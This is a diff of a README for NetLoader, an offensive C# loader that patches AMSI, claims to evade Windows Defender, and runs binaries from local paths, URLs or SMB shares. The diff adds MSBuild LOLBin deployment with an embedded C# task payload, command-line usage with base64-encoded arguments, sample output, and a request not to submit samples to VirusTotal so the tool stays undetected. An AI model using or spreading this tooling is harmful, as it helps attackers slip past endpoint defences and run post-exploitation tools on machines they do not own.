@@ -1,33 +1,30 @@
 # NetLoader
-Loads any C# binary in mem, patching AMSI and bypassing Windows Defender
+Loads any C# binary from filepath or url, patching AMSI and bypassing Windows Defender on runtime
 
-The binaries in this repo SHOULD be all clean and newly compiled from their respective GitHub repos, but feel free to compile / host your own.
-(Don't consider running binaries from this repo good OPSEC) 
-Code is designed to get binaries from a GitHub repo, so should be straight forward.
+Latest update / signature fix was 02.07.2020, clean as a whistle
+I am doing 24/7 signature checks and pushing updates when possible so I can keep NetLoader undetected (mainly for my own educational purposes).
+**Please do not upload to VirusTotal and DISABLE "Sample Submission" when testing / possible**
 
-1. Clone your own repo from this
-2. Change the url on line 13 in Program.cs
-3. Re-Compile / add your own binaries in /Binaries (Regex looks for .bin only!)
-3. Build and enjoy!
+**Looking for binaries/payloads to deploy? Checkout [SharpCollection](https://github.com/Flangvik/SharpCollection)**!. SharpCollection contains nightly builds of C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines.
 
 # Compile
-Changed because Defender added some signatures related to VS ressources.
-(Also just way simpler)
+
 	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:RandomName.exe Program.cs
 
-![netload](https://github.com/Flangvik/NetLoader/raw/master/Screenshots/netloader.jpg)
+# Deploy via LOLBin (MSBuild)
 
+Payload for MSBuild is in the /LOLBins folder, might push this for varius other LOLBins aswell.
+Arguments have to be added into the bottom XML file when NetLoader is deployed using MSBuild
 
-As of 05.05.2020, pretty much clean as a whistle
-(Going to try to update and keep it like this) 
-![scanresults](https://scanmybin.net/img/5e67b051ac75e83a1771782d121178b50f67c3da84190084feca4ded2893a924)
-
-Credits to https://twitter.com/_RastaMouse for the AMSI bypass
--> https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
-
-# LOLBins
-
-Payload for MSBuild is in the repo (LOLBins) folder, might push this for varius other LOLBins aswell.
+	Adding arguments to the XML payload
+	    public class ClassExample : Task, ITask
+	    {
+	        public override bool Execute()
+	        {	//Add your arguments here 
+	            SoullikePrincelier.Main(new string[] { "--path", "\\smbshare\Seatbelt.exe" });
+	            return true;
+	        }
+	    }
 
 	For 64 bit:
 	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml
@@ -35,11 +32,76 @@ Payload for MSBuild is in the repo (LOLBins) folder, might push this for varius 
 	For 32 bit:
 	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml
 
+# Usage
+Deploy payload from local path or SMB share (note that NetLoader automatically detects whether the path provided is local or remote)
+
+	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --path Seatbelt.exe --args whoami
+	[!] ~Flangvik , ~Arno0x #NetLoader
+	[+] Successfully patched AMSI!
+	[+] URL/PATH : Seatbelt.exe
+	[+] Arguments : whoami
+
+
+							%&&@@@&&
+							&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+							&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+	%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+	#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+	#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+	#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+	#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+	###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+	#####%######################  %%%..                       @////(((&%%%%%%%################
+							&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+							&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
+							 #%%%%##,
+
+
+	ERROR: Error running command "whoami"
+
+
+	[*] Completed collection in 0,008 seconds
+
+
+Supports base64 inputs for those long strings that would usually break stuff! 
+
+	PS C:\Users\Clark Kent\Desktop> .\NetLoader.exe --b64 --path U2VhdGJlbHQuZXhl --args d2hvYW1p
+	[!] ~Flangvik , ~Arno0x #NetLoader
+	[+] All arguments are Base64 encoded, decoding them on the fly
+	[+] Successfully patched AMSI!
+	[+] URL/PATH : Seatbelt.exe
+	[+] Arguments : whoami
+
+
+							%&&@@@&&
+							&&&&&&&%%%,                       #&&@@@@@@%%%%%%###############%
+							&%&   %&%%                        &////(((&%%%%%#%################//((((###%%%%%%%%%%%%%%%
+	%%%%%%%%%%%######%%%#%%####%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+	#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+	#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+	#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+	#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+	###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+	#####%######################  %%%..                       @////(((&%%%%%%%################
+							&%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*
+							&%%&&&%%%%%        v1.0.0         ,(((&%%%%%%%%%%%%%%%%%,
+							 #%%%%##,
+
+
+	ERROR: Error running command "whoami"
+
+
+	[*] Completed collection in 0,006 seconds
+
+
 # Todo
-- [ ]  Automate the build and release of many of the Sharp Tools so they automagically appear in /Binaries (CDI / Azure DevOps)
-- [ ]  Add support for non-interactive use (input args)
+- [X]  Automate the build and release of many of the Sharp Tools so they automagically appear in ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) (CDI / Azure DevOps)
+- [X]  Add support for non-interactive use (input args)
 - [X]  Add support to run custom modules from your own URL or SMB Share (Great for on-the-fly Implant deployment)
-- [ ]  Add some missing stuff SharpSploit and SharpShell (Need to fix some deps)
-- [ ]  Propely confirm and test every current bin
 - [X]  Add an working MSBuild XML payload for the LOLBins lovers (Myself included)
-- [ ]  Update with credits and links to the github repos that /Binaries are compiled from
+- [X]  Update with credits and links to the github repos that ~~/Binaries~~ [SharpCollection](https://github.com/Flangvik/SharpCollection) are compiled from
+
+# Credits
+[Arno0x](https://twitter.com/Arno0x0x) for the partial rewrite that is now merged into the main repo [see gist](https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2)
+[_RastaMouse](https://twitter.com/_RastaMouse/) for the [AMSI bypass](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs)
+
